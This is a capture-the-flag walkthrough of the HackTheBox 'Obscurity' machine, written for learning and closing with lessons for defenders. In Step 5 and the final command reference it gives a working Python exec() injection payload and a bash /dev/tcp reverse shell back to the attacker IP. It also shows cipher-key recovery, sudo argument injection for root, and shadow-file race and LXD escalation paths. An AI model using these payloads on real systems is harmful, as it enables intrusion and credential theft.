# HackTheBox: Obscurity - Complete Walkthrough

**Target IP:** `10.129.227.178`  
**Attacker IP:** `10.10.16.84`  
**Difficulty:** Medium  
**OS:** Linux

---

## Table of Contents
1. [Introduction & Mindset](#introduction--mindset)
2. [Step 1: Initial Reconnaissance (Nmap)](#step-1-initial-reconnaissance-nmap)
3. [Step 2: Web Enumeration](#step-2-web-enumeration)
4. [Step 3: Discovering the Secret Directory](#step-3-discovering-the-secret-directory)
5. [Step 4: Source Code Analysis](#step-4-source-code-analysis)
6. [Step 5: Exploiting Python exec() Injection](#step-5-exploiting-python-exec-injection)
7. [Step 6: Stabilizing the Shell](#step-6-stabilizing-the-shell)
8. [Step 7: Post-Exploitation Enumeration](#step-7-post-exploitation-enumeration)
9. [Step 8: Cryptographic Analysis (Known-Plaintext Attack)](#step-8-cryptographic-analysis-known-plaintext-attack)
10. [Step 9: Privilege Escalation to robert](#step-9-privilege-escalation-to-robert)
11. [Step 10: Root Privilege Escalation](#step-10-root-privilege-escalation)
12. [Alternative Root Paths](#alternative-root-paths)
13. [Lessons Learned](#lessons-learned)

---

## Introduction & Mindset

### What is "Security Through Obscurity"?

This box is literally named **Obscurity**, and its theme is *"security through obscurity."* This is a critical concept in cybersecurity:

> **Security through obscurity** is the reliance on the secrecy of the design or implementation as the main method of providing security for a system.

The website even jokes about it: *"you can't be hacked if attackers don't know what software you're using!"* This is a **fallacy**. Real security comes from strong design, peer review, and assuming the attacker **already knows** how your system works (Kerckhoffs's Principle).

### The Hacker Mindset for This Box

Before we start typing commands, let's understand the mindset:

1. **Assume nothing is truly hidden.** The devs think their "secret" directory is safe because it's not linked anywhere. We know better.
2. **Source code is the ultimate target.** If we can read the source code of a custom application, we can find vulnerabilities that black-box testing would never reveal.
3. **Custom crypto is almost always broken.** The box advertises an "unbreakable encryption algorithm." In the real world, custom cryptography is a huge red flag. Standard algorithms (AES, RSA, ChaCha20) are standard for a reason -- they've been tested by thousands of cryptographers.
4. **Look for developer mistakes, not complex exploits.** The `exec()` vulnerability we'll find is a basic Python mistake. The root escalation is a logic flaw in argument parsing. These aren't zero-days -- they're careless coding.

---

## Step 1: Initial Reconnaissance (Nmap)

### The Commands

```bash
nmap -p- --min-rate 10000 10.129.227.178
nmap -p 22,8080 -sC -sV -oA scans/nmap 10.129.227.178
```

### Why We Do This

**Reconnaissance is the foundation of every penetration test.** You cannot attack what you don't know exists. The first command (`-p-`) scans all 65,535 TCP ports. The second (`-sC -sV`) runs default scripts and version detection on the open ports we found.

### The Hacker Mindset

We're asking: *"What services are running? What versions? What can I talk to?"*

- **Port 22 (SSH):** Standard OpenSSH. Probably not our initial entry point unless we have credentials, but we'll note it for later.
- **Port 8080 (HTTP):** A web server running something called `BadHTTPServer`. This is **not** Apache, Nginx, or IIS. It's **custom software** -- immediately interesting because custom software often has custom vulnerabilities.
- **Ports 80 and 9000 are closed:** Interesting that they send RST packets instead of no-response. This tells us the host is actively rejecting connections on those ports, which might hint at firewall rules or future pivoting opportunities.

### Key Takeaway

> **Custom services = custom vulnerabilities.** When you see a non-standard service name like `BadHTTPServer`, your interest should spike. Standard servers have had decades of security patches. Custom servers are often written by developers who aren't security experts.

---

## Step 2: Web Enumeration

### The Commands

```bash
curl http://10.129.227.178:8080
```

### Why We Do This

Web applications are the most common attack surface. We need to understand what the application does, what technologies it uses, and whether it leaks any information.

### The Hacker Mindset

We're reading the page like an investigator, not a user. We're not looking at the pretty CSS -- we're looking for:
- Comments in the source code
- Hidden directories or paths
- Developer notes or debug information
- Technology stack hints

### What We Found

The page is a promotional site for "0bscura" -- a company that writes all its own software. The critical finding is in the **Development** section:

> "Message to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory"

### Why This Is Huge

This is a **classic information disclosure** vulnerability. The developers left a note for themselves that tells us:
1. The exact filename: `SuperSecureServer.py`
2. The file exists in a "secret development directory"
3. The directory is accessible via the web server somehow

### Key Takeaway

> **Developers often leak critical information in comments, notes, and error messages.** Always read the full page content and view the page source. What looks like an internal note to a developer is a roadmap to an attacker.

---

## Step 3: Discovering the Secret Directory

### The Commands

```bash
grep dev /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > dev_dirs
ffuf -u http://10.129.227.178:8080/FUZZ/SuperSecureServer.py -w dev_dirs -c
```

### Why We Do This

We know the filename (`SuperSecureServer.py`) and we know it lives in a "secret development directory." We need to find the directory name. Since we can't guess it, we use **brute-force discovery** -- trying thousands of common directory names until one works.

### Why ffuf/wfuzz and Not gobuster/dirsearch?

The writeups noted that `gobuster` failed against this custom server because the server sends malformed HTTP responses that crash Go's HTTP parser. `ffuf` and `wfuzz` are more tolerant of weird responses.

### Why We Filtered for "dev"

The hint said "development directory." Instead of brute-forcing 220,000 words, we intelligently filtered the wordlist to only entries containing "dev" -- reducing it to ~343 words. This is **smart brute-forcing**: using context clues to reduce the search space.

### The Hacker Mindset

We're thinking: *"The developers are lazy. They probably used a simple, obvious name like 'dev', 'develop', 'development', or 'devel'. Let's not waste time on 'admin', 'backup', or 'test' when we have a strong hint."*

### What We Found

```
develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
```

The secret directory is `/develop`.

### Key Takeaway

> **Context-aware enumeration is faster than blind brute-forcing.** If you have a hint, use it. A 343-wordlist scan takes seconds; a 220,000-wordlist scan takes minutes and might crash.

---

## Step 4: Source Code Analysis

### The Commands

```bash
wget http://10.129.227.178:8080/develop/SuperSecureServer.py
cat SuperSecureServer.py
```

### Why We Do This

**Source code is the attacker's best friend.** When you can read the source code of a web application, you don't have to guess how it works -- you can see exactly how it processes input, where it sanitizes (or doesn't sanitize) data, and what assumptions the developer made.

### The Hacker Mindset

We're reading this code like a security auditor. We're not looking for "does it work?" -- we're looking for "how can I break it?"

Key questions we ask:
- Where does user input enter the system?
- Is that input sanitized, validated, or escaped?
- Does it reach any dangerous functions (`exec`, `eval`, `os.system`, `subprocess`, SQL queries, etc.)?
- Are there any logic flaws or race conditions?

### The Vulnerability

In the `serveDoc()` method, we find:

```python
def serveDoc(self, path, docRoot):
    path = urllib.parse.unquote(path)
    try:
        info = "output = 'Document: {}'" # Keep the output for later debug
        exec(info.format(path)) # This is how you do string formatting, right?
```

**Let's break down why this is catastrophic:**

1. **`path` comes from the HTTP request URL.** The user completely controls this.
2. **`urllib.parse.unquote(path)`** URL-decodes the path. This means `%20` becomes a space, `%27` becomes `'`, etc.
3. **`info.format(path)`** inserts the user-controlled path into a Python string.
4. **`exec()` executes that string as Python code.**

### The Developer's Mistake

The developer wanted to create a debug string like:
```python
output = 'Document: /index.html'
```

But they used `exec()` instead of simple assignment. If a user sends:
```
/'; os.system('id'); a='
```

The formatted string becomes:
```python
output = 'Document: '; os.system('id'); a=''
```

The `exec()` runs this as three separate Python statements:
1. `output = 'Document: '` (harmless assignment)
2. `os.system('id')` (**REMOTE CODE EXECUTION**)
3. `a=''` (harmless assignment)

### Why `os` Is Available

Notice at the top of the file:
```python
import os
```

Because `os` is already imported into the script's namespace, our injected code can use it directly without needing to import it ourselves.

### Key Takeaway

> **`exec()` and `eval()` with user input is always dangerous.** There is virtually no safe way to use these functions with untrusted data. If you see `exec()`, `eval()`, or `pickle.loads()` in code that processes user input, you've probably found your vulnerability.

---

## Step 5: Exploiting Python exec() Injection

### Proof of Concept (Ping)

**Terminal 1 (Listener):**
```bash
sudo tcpdump -i tun0 icmp
```

**Terminal 2 (Attack):**
```bash
curl "http://10.129.227.178:8080/';os.system('ping%20-c%201%2010.10.16.84');'"
```

### Why We Test with Ping First

Before we try to get a full shell, we use a **blind command execution test**. Why?
- We might not see direct output from the web server.
- A ping is safe, non-destructive, and confirms execution.
- If we get ICMP packets back, we **know** our injection syntax is correct.

### Why This Payload Works

Let's trace the payload through the code:

1. **HTTP Request:** `GET /';os.system('ping%20-c%201%2010.10.16.84');' HTTP/1.1`
2. **Request.doc:** `';os.system('ping%20-c%201%2010.10.16.84');'`
3. **URL Decode:** `';os.system('ping -c 1 10.10.16.84');'`
4. **String Format:** `output = 'Document: ';os.system('ping -c 1 10.10.16.84');''`
5. **exec() runs it.** The middle statement executes `ping -c 1 10.10.16.84`.

### The Hacker Mindset

We're being methodical: *"Don't rush to a reverse shell. Confirm the primitive first. If the ping works, the shell will work. If the ping fails, I need to debug my payload syntax before I waste time on a listener."*

### Getting the Reverse Shell

**Terminal 1 (Listener):**
```bash
nc -lvnp 443
```

**Terminal 2 (Attack):**
```bash
curl "http://10.129.227.178:8080/';os.system('bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/10.10.16.84/443%200%3E&1%22');'"
```

### Why This Payload?

We're using a **bash reverse shell one-liner**:
```bash
bash -c "bash -i >& /dev/tcp/10.10.16.84/443 0>&1"
```

This creates an interactive bash session that redirects:
- `stdout` and `stderr` (`>&`) to a TCP connection to our Kali machine
- `stdin` (`0>&1`) from that same connection

We wrap it in `bash -c` because the `os.system()` call needs a single command string. We URL-encode spaces and special characters so the HTTP request is valid.

### Key Takeaway

> **Always verify your exploit primitive with a safe test (ping/dns) before deploying a reverse shell.** This saves time debugging whether your shell failed because of networking issues, firewall rules, or bad payload syntax.

---

## Step 6: Stabilizing the Shell

### The Commands

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z
stty raw -echo; fg
reset
```

### Why We Do This

A **basic netcat shell** is limited:
- No command history (arrow keys don't work)
- No tab completion
- No clear command
- `Ctrl+C` kills the shell instead of cancelling a command
- Some commands (like `sudo`, `vim`, `ssh`) require a TTY (terminal device)

### What PTY Does

PTY stands for **Pseudo-Terminal**. It makes our shell behave like a real terminal session. The `stty raw -echo` command on our Kali machine tells our local terminal to pass keystrokes directly to the remote shell without interpreting them locally.

### The Hacker Mindset

We're thinking: *"I have a shell, but it's fragile. Before I start exploring and running complex commands, I need a stable environment. A broken shell during privilege escalation could mean losing access and having to start over."*

### Key Takeaway

> **Stabilize your shell immediately.** Don't explore the target with a bare netcat shell. A PTY shell prevents accidental disconnections and enables commands that require interactive input.

---

## Step 7: Post-Exploitation Enumeration

### The Commands

```bash
cd /home/robert && ls -la
cat check.txt
cat out.txt
cat passwordreminder.txt
python3 SuperSecureCrypt.py -h
```

### Why We Do This

Now that we have a stable shell as `www-data`, we need to **escalate privileges**. The first place to look is always `/home` -- user home directories often contain:
- SSH keys
- Passwords or password hints
- Configuration files with credentials
- Scripts or applications with vulnerabilities

### What We Found

```
check.txt            - plaintext message
out.txt              - encrypted output
passwordreminder.txt - encrypted password reminder
SuperSecureCrypt.py  - the encryption program
user.txt             - the user flag (unreadable by www-data)
```

### The Hacker Mindset

We're seeing a pattern: the box gives us both the **encryption tool** and a **known plaintext/ciphertext pair**. This is a huge hint. The developer left `check.txt` (plaintext) and `out.txt` (ciphertext) as a way to verify the encryption key works. For an attacker, this is a gift.

We're thinking: *"If I can figure out how this encryption works, I can use the known plaintext to recover the key. Then I can decrypt the password reminder and get robert's password."*

### Key Takeaway

> **Always check user home directories thoroughly.** Look for scripts, text files, and anything that stands out. Developers often leave test files, credentials, or hints that make privilege escalation trivial.

---

## Step 8: Cryptographic Analysis (Known-Plaintext Attack)

### Understanding the Encryption

Looking at `SuperSecureCrypt.py`:

```python
def encrypt(text, key):
    keylen = len(key)
    keyPos = 0
    encrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr + ord(keyChr)) % 255)
        encrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return encrypted

def decrypt(text, key):
    keylen = len(key)
    keyPos = 0
    decrypted = ""
    for x in text:
        keyChr = key[keyPos]
        newChr = ord(x)
        newChr = chr((newChr - ord(keyChr)) % 255)
        decrypted += newChr
        keyPos += 1
        keyPos = keyPos % keylen
    return decrypted
```

### Breaking Down the Math

This is essentially a **Vigenere cipher** with modulo 255 instead of 26:

- **Encryption:** `cipher_char = (plain_char + key_char) % 255`
- **Decryption:** `plain_char = (cipher_char - key_char) % 255`

### Why Custom Crypto Is Bad

Real-world encryption uses algorithms like AES because:
1. They resist known-plaintext attacks
2. They use complex substitution-permutation networks
3. They have been analyzed by cryptographers for decades

This custom algorithm is just **repeated addition**. If you know any plaintext and its ciphertext, you can solve for the key:

```
key_char = (cipher_char - plain_char) % 255
```

### The Attack: Using the Script Against Itself

We have:
- `check.txt` = plaintext
- `out.txt` = ciphertext of check.txt

If we "decrypt" `out.txt` using `check.txt` as the "key," the math works out to:

```
result = (cipher_char - plain_char) % 255 = key_char
```

So we run:
```bash
python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o /tmp/key.txt
cat /tmp/key.txt
```

**Output:** `alexandrovichalexandrovichalexandrovich...`

The key is **`alexandrovich`**.

### Decrypting the Password

Now that we have the key:
```bash
python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o /tmp/passwd.txt
cat /tmp/passwd.txt
```

**Output:** `SecThruObsFTW`

### The Hacker Mindset

We're thinking: *"The developer wanted to test their encryption, so they left a plaintext/ciphertext pair. They didn't realize this completely breaks their cipher. This is why Kerckhoffs's Principle says the security of a cipher should depend ONLY on the key, not on keeping the algorithm secret."*

### Key Takeaway

> **Never roll your own cryptography.** And if you find custom crypto on a target, look for known-plaintext or chosen-plaintext opportunities. Test files, example outputs, and encrypted data with predictable structure (like JSON, XML, or English text headers) are all potential attack vectors.

---

## Step 9: Privilege Escalation to robert

### The Commands

```bash
su robert
# Password: SecThruObsFTW
cat /home/robert/user.txt
```

### Why We Do This

Now that we have robert's password, we can authenticate as him. We use `su` (switch user) instead of SSH because we already have a shell on the box -- no need to make a new network connection.

### What We Found

**User flag:** `7603f0f[redacted]35349696`

### The Hacker Mindset

We're now thinking about the next target: root. Before we hunt for root, we check what privileges robert has.

---

## Step 10: Root Privilege Escalation

### Checking sudo Privileges

```bash
sudo -l
```

**Output:**
```
User robert may run the following commands on obscure:
    (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
```

### Why This Is Interesting

`sudo -l` tells us what commands robert can run as root without a password. The only entry is a **custom Python script** -- another instance of custom software. Custom software running with elevated privileges is a **privilege escalation goldmine**.

### Analyzing BetterSSH.py

The script:
1. Reads a username and password from the user
2. Copies `/etc/shadow` to `/tmp/SSH/[random_name]`
3. Sleeps for 0.1 seconds
4. Validates the password against the shadow hash
5. If authenticated, enters a loop that runs commands via `sudo -u [user]`

The critical code is:
```python
command = input(session['user'] + "@Obscure$ ")
cmd = ['sudo', '-u',  session['user']]
cmd.extend(command.split(" "))
proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
```

### Finding the Vulnerability

The script builds the command list as:
```python
cmd = ['sudo', '-u', 'robert']
# Then extends with our input
cmd = ['sudo', '-u', 'robert', '-u', 'root', 'cat', '/root/root.txt']
```

**How `sudo` handles multiple `-u` flags:** When `sudo` receives multiple `-u` options, the **last one wins**. This is standard behavior for many command-line tools.

So `sudo -u robert -u root cat /root/root.txt` executes as **root**.

### The Hacker Mindset

We're analyzing the script as if we wrote it. We ask:
- *"What assumptions did the developer make?"* They assumed the user would only enter simple commands.
- *"What can I inject?"* The `command.split(" ")` splits on spaces, but `sudo` parses arguments sequentially. Adding `-u root` before our real command hijacks the privilege level.
- *"Why does this work?"* Because the developer trusted user input to be a simple command, not a command with its own flags.

### Exploitation

```bash
mkdir -p /tmp/SSH
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
# Enter username: robert
# Enter password: SecThruObsFTW
# Authed!
# robert@Obscure$ -u root cat /root/root.txt
```

**Root flag:** `ea0cac[redacted]695d4b6d`

### Why We Created /tmp/SSH First

The script writes the shadow file to `/tmp/SSH/[random]`. If `/tmp/SSH` doesn't exist, the script crashes with a `FileNotFoundError`. This is a small detail that could block exploitation if we didn't know about it.

### Key Takeaway

> **When analyzing sudo privileges, always read the source code of custom scripts.** Look for:
> - `subprocess.Popen`, `os.system`, or `exec` with user input
> - Command-line argument injection opportunities
> - Race conditions (file operations with predictable paths or timing windows)
> - Path hijacking (directories in PATH that are writable by the user)

---

## Alternative Root Paths

### Path 1: Race Condition on Shadow File

The script writes `/etc/shadow` to `/tmp/SSH/[random_name]` and leaves it there for **0.1 seconds**. An attacker could:
1. Run a loop constantly reading `/tmp/SSH/*`
2. Run BetterSSH simultaneously
3. Catch the shadow file before it's deleted
4. Crack the root password hash with `john` or `hashcat`

**Why this works:** The developer assumed 0.1 seconds was "too fast" to exploit. On a modern CPU, 0.1 seconds is an eternity.

### Path 2: Directory Replacement

If robert had write access to the `BetterSSH` directory, he could:
1. `mv BetterSSH BetterSSH-old`
2. `mkdir BetterSSH`
3. Write a malicious `BetterSSH.py` that spawns a root shell
4. Run `sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py`

**Why this works:** `sudo` checks the path, not the file contents. If you can replace the directory or file, you control what runs as root.

**Note:** In our instance, this was patched -- the `BetterSSH` directory was owned by root and not writable by robert.

### Path 3: Python Path Hijacking (Patched)

Python loads modules from the script's directory first. If `BetterSSH/` was writable, robert could create a fake `subprocess.py` in that directory. When BetterSSH imported `subprocess`, it would load robert's malicious version instead of the system library.

**Why this works:** Python's module resolution prioritizes the local directory. This is well-known behavior that many developers forget about.

### Path 4: LXD Group (Patched)

At release, robert was in the `lxd` group. Members of the `lxd` group can create privileged containers that mount the host filesystem. An attacker could:
1. Import an Alpine Linux container image
2. Create a privileged container with the host root mounted as `/mnt/root`
3. Access any file on the host as root

**Why this works:** LXD containers share the kernel with the host. A privileged container has root access to the host's kernel namespaces and mounted filesystems.

---

## Lessons Learned

### For Attackers

1. **Custom software is fertile ground for vulnerabilities.** Always prioritize custom applications over standard, well-tested services.
2. **Source code access changes everything.** A single source file leak can turn a black-box test into a code audit.
3. **Never underestimate developer laziness.** "Secret" directories, hardcoded credentials, debug comments, and test files are everywhere.
4. **Custom cryptography is a vulnerability, not a feature.** If you see homegrown encryption, look for known-plaintext attacks.
5. **Sudo on custom scripts is dangerous.** Always analyze what the script does and how it handles user input.

### For Defenders

1. **Never use `exec()` or `eval()` with user input.** There is no safe way to do this.
2. **Don't rely on obscurity.** Hiding your source code or using custom algorithms doesn't make you secure.
3. **Remove debug code and comments before deployment.** That "note to devs" gave away the entire attack path.
4. **Use standard cryptography.** AES, RSA, and ChaCha20 exist for a reason.
5. **Audit custom scripts running with elevated privileges.** Especially any script that uses `subprocess`, `os.system`, or handles user input.
6. **Set strict permissions on sensitive directories.** If a directory contains a script that runs as root, no unprivileged user should be able to rename, modify, or write to it.

---

## Complete Command Reference

```bash
# Step 1: Recon
nmap -p- --min-rate 10000 10.129.227.178
nmap -p 22,8080 -sC -sV 10.129.227.178

# Step 2: Web enum
curl http://10.129.227.178:8080

# Step 3: Directory fuzzing
grep dev /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt > dev_dirs
ffuf -u http://10.129.227.178:8080/FUZZ/SuperSecureServer.py -w dev_dirs -c

# Step 4: Download source
wget http://10.129.227.178:8080/develop/SuperSecureServer.py

# Step 5: Exploit - Ping test
sudo tcpdump -i tun0 icmp
curl "http://10.129.227.178:8080/';os.system('ping%20-c%201%2010.10.16.84');'"

# Step 5: Exploit - Reverse shell
nc -lvnp 443
curl "http://10.129.227.178:8080/';os.system('bash%20-c%20%22bash%20-i%20%3E&%20/dev/tcp/10.10.16.84/443%200%3E&1%22');'"

# Step 6: Stabilize shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg

# Step 7-8: Crypto attack
python3 SuperSecureCrypt.py -i out.txt -k "$(cat check.txt)" -d -o /tmp/key.txt
cat /tmp/key.txt  # alexandrovich
python3 SuperSecureCrypt.py -i passwordreminder.txt -k alexandrovich -d -o /tmp/passwd.txt
cat /tmp/passwd.txt  # SecThruObsFTW

# Step 9: User privesc
su robert
cat /home/robert/user.txt

# Step 10: Root privesc
mkdir -p /tmp/SSH
sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
# username: robert
# password: SecThruObsFTW
# -u root cat /root/root.txt
```

---

*Happy Hacking!*
